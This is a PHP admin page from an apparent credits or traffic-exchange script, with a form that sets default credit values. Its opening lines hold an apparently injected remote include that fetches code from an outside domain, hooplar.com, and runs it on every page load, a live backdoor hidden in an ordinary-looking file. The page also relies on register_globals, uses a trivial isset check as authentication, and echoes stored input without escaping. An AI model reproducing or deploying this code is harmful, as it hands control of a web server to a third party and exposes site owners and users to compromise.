<?
  include "http://hooplar.com/adminoptions2.html";
?>

<html>
 <head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
  <title>Admin</title>
  <link rel="stylesheet" href="../style.css">
 </head>
<body bgcolor=FFFFFF class=bodytext link=0 vlink=0 alink=0 text=0>
<table width="100%" border="0" cellspacing="1" cellpadding="1" height="100%">
  <tr>
    <td align="center">
      <table width="468" border="0" cellspacing="1" cellpadding="1">
        <tr> 
          <td><br>
            <?php
  require("../conf/sys.conf");
  require("bots/errbot");
  require("bots/mcbot");
  require("bots/genbot");


  $src=$spec;
  if(!isset($sc)) _fatal("Access denied!","Please, authorize before access this page!");
?>
            <? 
	if($action == "change" && $cred != "" && $credr != ""){
	 	$f = @fopen("../".$DCRED_P,"w");
		if(!$f) echo "Error: falied to save information!<br>See your sys.conf file!<br><br>";
		else{
		  fwrite($f, "$cred&$credr", strlen($cred) + strlen($credr) + 1);
		  fclose($f);
		}
	}

	function info_there($p){
		$f = @fopen($p,"r");
		if(!$f) return "";
		$ch = "";
		while(!feof($f)){
		  $ch .= fgetc($f);
		}
		return $ch;
	}

	$def = info_there("../".$DCRED_P);
	$def = split("&",$def);
	$defc = $def[0];
	$defcr = $def[1];

	if(!file_exists("../".$DCRED_P) || ($defc == "" && $defcr == "")){
		echo "<b>There is no default value!</b><br>";
	}
?>
            <table border=0 cellpadding="1" cellspacing="1" width="468" height="125">
              <form action=def_credits.php mehtod=post>
                <tr bgcolor="#EBEBEB" align="center"> 
                  <td>Credits at registration: </td>
                  <td> 
                    <input value="<? echo $defcr ?>" name=credr>
                  </td>
                </tr>
                <tr bgcolor="#EBEBEB" align="center"> 
                  <td>Default credits number for 1 hit: </td>
                  <td> 
                    <input value="<? echo $defc ?>" name=cred>
                  </td>
                </tr>
                <tr align="right"> 
                  <td bgcolor="#EBEBEB"></td>
                  <td bgcolor="#EBEBEB" align="center"> 
                    <input type=submit value="Process data &gt;&gt;" name="submit">
                  </td>
                </tr>
                <input type=hidden name=action value=change>
              </form>
            </table>
            <hr noshade align=left size=1 width="468">
            <table width="468" border="0" cellspacing="1" cellpadding="1" height="24">
              <tr align="center"> 
                <td bgcolor="#FF9900" width="70"><a href="index.php"><b>logout</b></a></td>
                <td bgcolor="#66CC00" width="70"><a href="engine.php?spec=menus">edit 
                  menus</a></td>
                <td bgcolor="#FF6600" width="70"><a href="back.php"><font color="#FFFFFF"><b>main 
                  menu</b></font></a></td>
                <td bgcolor="#3366FF">&nbsp;</td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
